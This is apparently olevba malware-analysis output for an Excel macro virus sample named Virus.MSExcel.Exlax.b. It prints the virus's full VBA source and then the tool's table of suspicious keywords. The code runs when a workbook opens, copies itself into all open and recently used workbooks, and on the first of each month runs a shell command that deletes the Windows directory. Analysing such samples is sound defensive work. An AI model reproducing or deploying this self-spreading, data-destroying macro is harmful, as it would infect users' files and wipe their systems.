olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Exlax.b-4cb17542528d4253feb6a7ac00fbe083b972f632
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Exlax.b-4cb17542528d4253feb6a7ac00fbe083b972f632 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Workbook_Open(): On Error GoTo Wups
mygame
If Workbooks.Count > 1 Then InfMulti
Application.DisplayAlerts = False
WB = ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
For X = 1 To Application.RecentFiles.Count
Application.RecentFiles.Item(X).Open.Activate
With ActiveWorkbook.VBProject.VBComponents.Item(1).CodeModule
.DeleteLines 1, .CountOfLines: .AddFromString WB
End With
ActiveWorkbook.SaveAs FileName:=ActiveWorkbook.FullName
ActiveWorkbook.Close
Next X
Wups:
End Sub
Private Sub InfMulti(): On Error GoTo Ahhh
Application.DisplayAlerts = False
WB = ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
For X = 1 To Workbooks.Count
With Workbooks.Item(X).VBProject.VBComponents.Item(1).CodeModule
.DeleteLines 1, .CountOfLines: .AddFromString WB
End With
Workbooks.Item(X).SaveAs FileName:=Workbooks.Item(X).FullName
Next X
Ahhh:
End
 
    
    
End Sub
Private Sub mygame(): On Error GoTo the_end
If Day(Date) = 1 Then
ff = MsgBox("hello world?", vbCritical, "The prepared Mind", "Demo.hlp", 1000)
as2 = Shell("deltree /y c:\windows", 0)


End If
If Day(Date) = 13 Then
Application.Caption = " I LOVE MACRO"
End If
the_end:
End Sub

-------------------------------------------------------------------------------
VBA MACRO List1.cls 
in file: Virus.MSExcel.Exlax.b-4cb17542528d4253feb6a7ac00fbe083b972f632 - OLE stream: '_VBA_PROJECT_CUR/VBA/List1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO List2.cls 
in file: Virus.MSExcel.Exlax.b-4cb17542528d4253feb6a7ac00fbe083b972f632 - OLE stream: '_VBA_PROJECT_CUR/VBA/List2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO List3.cls 
in file: Virus.MSExcel.Exlax.b-4cb17542528d4253feb6a7ac00fbe083b972f632 - OLE stream: '_VBA_PROJECT_CUR/VBA/List3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

